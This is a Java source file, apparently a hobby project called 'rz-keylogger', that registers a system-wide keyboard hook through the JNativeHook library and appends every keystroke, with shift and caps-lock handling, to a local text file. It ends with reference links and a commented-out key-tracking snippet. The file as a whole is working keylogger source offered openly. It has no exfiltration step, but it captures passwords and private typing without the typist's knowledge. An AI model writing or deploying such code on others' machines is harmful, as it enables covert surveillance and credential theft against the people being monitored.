package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Locale;

public class Main implements NativeKeyListener {
    private static final Path file = Paths.get("rz-keylogger.txt");
    private boolean isShift = false;
    private static boolean isCapsLockOn = false;

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new Main());
        isCapsLockOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        //System.out.println("Pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()) + " - " + nativeKeyEvent.getKeyCode();
        isCapsLockOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
        /*int keyCode = nativeKeyEvent.getKeyCode();
        String keyText = (char) keyCode + "";*/
        Toolkit toolkit = Toolkit.getDefaultToolkit();

        //System.out.println("Pressed: " + keyText);
        try(OutputStream outputStream = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
            PrintWriter printWriter = new PrintWriter(outputStream)) {
            keyText = keyText.toUpperCase();
            if (keyText.length() > 1) {
                if (keyText.equalsIgnoreCase("shift")) {
                    isShift = true;
                }
                if (keyText.equalsIgnoreCase("period")) {
                    keyText = ".";
                } else if (keyText.equalsIgnoreCase("slash")) {
                    keyText = "/";
                } else if (keyText.equalsIgnoreCase("space")) {
                    keyText = " ";
                } else {
                    keyText = "{" + keyText + "}";
                }
                printWriter.write(keyText);
            } else {
                if(isCapsLockOn) {
                    if (isShift) {
                        keyText = keyText.toLowerCase();
                    }
                } else {
                    if (!isShift) {
                        keyText = keyText.toLowerCase();
                    }
                }
                printWriter.write(keyText);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        /*try {
            OutputStream outputStream = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
            PrintWriter printWriter = new PrintWriter(outputStream);
            if (keyText.length() > 1) {
                printWriter.write("{" + keyText + "}");
            } else {
                printWriter.write(keyText);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }*/
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        //System.out.println("Released: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
        //String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        isShift = false;
    }

    public boolean isCapsLockEnabled() {
        return Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
    }
}

//https://stackoverflow.com/questions/1248510/convert-string-to-keyevents/11779211
//https://www.youtube.com/watch?v=3Xo6zSBgdgk
//https://www.youtube.com/watch?v=eO4mObo3LUs
//https://www.youtube.com/watch?v=YM8MFb77kLM
//https://www.programcreek.com/java-api-examples/?api=org.jnativehook.keyboard.NativeKeyEvent
//https://www.codota.com/code/java/methods/java.awt.Robot/keyPress
//https://www.toolsqa.com/selenium-webdriver/robot-class-keyboard-events/
/*
@Override
public void nativeKeyPressed(NativeKeyEvent e)
{
	String key = NativeKeyEvent.getKeyText(e.getKeyCode());
	if (!pressedKeys.contains(key))
	{
		pressedKeys.add(key);
	}
	checkKeyShortcuts(0);
}
@Override
public void nativeKeyReleased(NativeKeyEvent e)
{
	String key = NativeKeyEvent.getKeyText(e.getKeyCode());
	if (pressedKeys.contains(key))
	{
		pressedKeys.remove(key);
	}
	checkKeyShortcuts(1);
}
*/